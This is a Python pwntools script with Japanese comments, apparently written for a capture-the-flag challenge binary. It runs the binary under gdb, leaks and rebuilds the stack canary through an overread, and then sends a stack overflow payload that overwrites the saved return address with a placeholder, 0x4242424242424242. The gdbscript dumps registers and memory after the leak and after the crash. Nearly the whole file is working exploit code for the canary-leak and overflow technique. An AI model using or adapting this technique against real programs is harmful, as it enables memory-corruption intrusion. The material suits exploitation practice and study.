#!/usr/bin/env python3
# exploit_gdb.py
# pwntools + gdb.debug で、リーク直後とクラッシュ直後のメモリ/レジスタを自動出力します。
from pwn import *
import re
import time

BINARY = './chal'         # <- 実際のバイナリ名に置換
BUF_LEN = 104
LEAK_SEND_LEN = 104       # あなたの成功値
TARGET_RIP = 0x4242424242424242

context.binary = ELF(BINARY)
context.log_level = 'debug'
# 端末設定: tmux や mate-terminal 等使えるなら指定。なければ None にしてインライン出力にする
# context.terminal = ['tmux','splitw','-h']

gdbscript = r'''
set pagination off
# breakpoint at main for initial stop
break main
run

# --- Catch read syscall or PLT read to stop when read happens ---
# Try break read (works if symbol exists):
# If dynamically linked, you may want 'break read@plt'
# or use 'catch syscall read' if break read fails.
#break read
catch syscall read
continue

# When read syscall returns, we're just after kernel read: show registers & memory
printf "===== AFTER read returned (leak stage) =====\n"
info registers
printf "canary at fs:0x28: "
x/gx $fs:0x28
printf "stack around rsp:\n"
x/64gx $rsp
printf "rbp frame area (bytes):\n"
# try to show probable buffer region relative to rbp
x/256bx $rbp-0x80
printf "=============================================\n"

# continue execution until crash or __stack_chk_fail
continue

# if crash happens, print info
printf "===== CRASH / STOP =====\n"
info registers
x/gx $fs:0x28
x/64gx $rsp
x/256bx $rbp-0x80
bt
printf "===== END =====\n"
'''

def extract_canary_from_output(out):
    # Same extraction as before: find "Your input is " ... "\nIs this okay"
    marker1 = b"Your input is "
    marker2 = b"\nIs this okay"
    i1 = out.find(marker1)
    if i1 == -1:
        return None
    i1 += len(marker1)
    i2 = out.find(marker2, i1)
    if i2 == -1:
        i2 = len(out)
    leaked = out[i1:i2].rstrip(b'\r\n')
    # find trailing non-A bytes
    m = re.search(b'(A+)(.*)$', leaked)
    if not m:
        return None
    trailing = m.group(2)
    if len(trailing) == 0:
        return None
    last7 = trailing[:7].ljust(7, b'\x00')
    canary = b'\x00' + last7
    return canary

def main():
    # Start under gdb
    p = gdb.debug(BINARY, gdbscript=gdbscript)
    # Wait a short while for main/run/breakpoints to settle
    time.sleep(0.1)
    # Send leak payload (no newline), then EOF for canonical/pty handling
    p.write(b'B' * LEAK_SEND_LEN)
    # send EOF (Ctrl-D) to force read to return on PTY; if gdb debugging with pty, this may help
    p.write(b'\x04')
    # receive output produced until breakpoint triggers
    try:
        out = p.recv(timeout=2)
    except Exception:
        out = b''
    log.info("Captured leak-stage output (len=%d)", len(out))
    log.debug(repr(out))

    canary = extract_canary_from_output(out)
    if not canary:
        log.warn("Failed to reconstruct canary automatically. Dumping captured output above.")
        p.interactive()
        return

    log.success("reconstructed canary: %s", canary.hex())

    # Now build exploit payload and send (same process)
    exploit = b'A' * (BUF_LEN-1) + b'C' + canary + b'B'*8 + p64(TARGET_RIP)
    log.info("sending exploit payload (len=%d)", len(exploit))
    # Send with newline to perform read() in subsequent iteration
    p.sendline(exploit)
    # accept prompt 'Is this okay' -> send 'Y'
    p.sendline(b'Y')
    # give gdb time to catch crash and run gdbscript prints
    try:
        time.sleep(0.2)
        rest = p.recv(timeout=2)
        log.debug("post-exploit output: %s", repr(rest))
    except Exception:
        pass

    # drop to interactive so you can use gdb prompt that was opened by gdb.debug
    p.interactive()

if __name__ == '__main__':
    main()

